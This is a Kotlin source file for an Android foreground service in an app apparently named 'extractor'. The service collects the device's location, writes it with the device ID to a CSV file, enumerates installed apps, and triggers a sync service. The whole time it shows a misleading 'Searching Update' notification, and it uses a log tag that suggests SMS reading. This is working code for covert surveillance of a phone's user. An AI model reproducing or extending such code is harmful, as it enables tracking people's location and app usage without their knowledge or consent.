package info.kalagato.com.extractor.readers

import android.Manifest
import info.kalagato.com.extractor.Util.getDeviceId
import android.content.Intent
import info.kalagato.com.extractor.Extractor
import android.app.PendingIntent
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import info.kalagato.com.extractor.readers.AppRunningStatus
import info.kalagato.com.extractor.SyncService
import android.location.LocationManager
import android.location.LocationListener
import android.content.pm.PackageManager
import android.location.Location
import android.os.*
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import info.kalagato.com.extractor.Constant
import info.kalagato.com.extractor.R
import java.io.File
import java.io.FileWriter
import java.lang.Exception
import java.text.SimpleDateFormat
import java.util.*

class LocationReader : Service() {
    private val TAG = "read-sms-service"
    private var mServiceLooper: Looper? = null
    private var mServiceHandler: ServiceHandler? = null
    override fun onCreate() {
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
        val thread =
            HandlerThread("Location_ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND)
        thread.start()

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.looper
        mServiceHandler = ServiceHandler(mServiceLooper)
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        val notificationIntent = Intent(applicationContext, Extractor::class.java)
        val pendingIntent = PendingIntent.getActivity(
            applicationContext,
            0, notificationIntent, 0
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                Constant.CHANNEL_ID,
                "My Foreground Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = ContextCompat.getSystemService(
                applicationContext, NotificationManager::class.java
            )
            manager?.createNotificationChannel(chan)
        }
        val notification = NotificationCompat.Builder(
            applicationContext,
            Constant.CHANNEL_ID
        ) //todo fix hardcoded channel id
            .setSmallIcon(R.drawable.ic_settings)
            .setContentTitle("Searching Update")
            .setContentText("")
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1, notification)
        try {
            // For each start request, send a message to start a job and deliver the
            // start ID so we know which request we're stopping when we finish the job
            val msg = mServiceHandler!!.obtainMessage()
            msg.arg1 = startId
            // Create a bundle with the data
            val bundle = Bundle()

            // Set the bundle data to the Message
            msg.data = bundle
            mServiceHandler!!.sendMessage(msg)
        } catch (e: Exception) {
        }

        //do heavy work on a background thread
        //stopSelf();
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        stopForeground(true)
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    // Handler to run on a thread to work in background
    private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
        override fun handleMessage(msg: Message) {
            location(applicationContext, msg)
            AppRunningStatus().getAllPackageInstalled(applicationContext)

            //checking sync
            val serviceIntent = Intent(applicationContext, SyncService::class.java)
            ContextCompat.startForegroundService(applicationContext, serviceIntent)
            // Stop the service using the startId, so that we don't stop
            // the service in the middle of handling another job
        }

        fun location(context: Context, msg: Message) {
            try {
                val locationManager = context.getSystemService(LOCATION_SERVICE) as LocationManager
                val locationListener: LocationListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        // Called when a new location is found by the network location provider.
                        try {
                            Log.d("TAG", "onLocationChanged: $location")
                            val folder = File(
                                Environment.getExternalStorageDirectory()
                                    .toString() + "/Folder"
                            )
                            val mydir = applicationContext.getDir(
                                "mydir",
                                MODE_PRIVATE
                            ) //Creating an internal dir;
                            /* boolean var = false;
                            if (!folder.exists())
                                var = folder.mkdir();*/
                            val c = Calendar.getInstance().time
                            val df = SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault())
                            val formattedDate = df.format(c)
                            val filename = (mydir.toString() + "/" + Constant.LOCATION + "_"
                                    + getDeviceId(context) + "_" + formattedDate + ".csv")
                            val fw = FileWriter(filename, true)
                            fw.append("" + c.time)
                            fw.append(",")
                            fw.append("" + location.longitude)
                            fw.append(",")
                            fw.append("" + location.latitude)
                            fw.append(",")
                            fw.append("" + location.accuracy)
                            fw.append(",")
                            fw.append('\n')
                            fw.flush()
                            fw.close()
                            stopSelf(msg.arg1)
                        } catch (e: Exception) {
                            e.printStackTrace()
                            Log.d("TAG", "onLocationChanged: " + e.localizedMessage)
                        }
                    }

                    override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
                    override fun onProviderEnabled(provider: String) {
                        Log.d("TAG", "onLocationChanged:  Provider enable ")
                    }

                    override fun onProviderDisabled(provider: String) {
                        Log.d("TAG", "onLocationChanged: provider disable")
                    }
                }
                if (ActivityCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    )
                    != PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(
                        context,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                    )
                    != PackageManager.PERMISSION_GRANTED
                ) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    return
                }
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    0,
                    0f,
                    locationListener
                )
            } catch (e: Exception) {
            }
        }
    }
}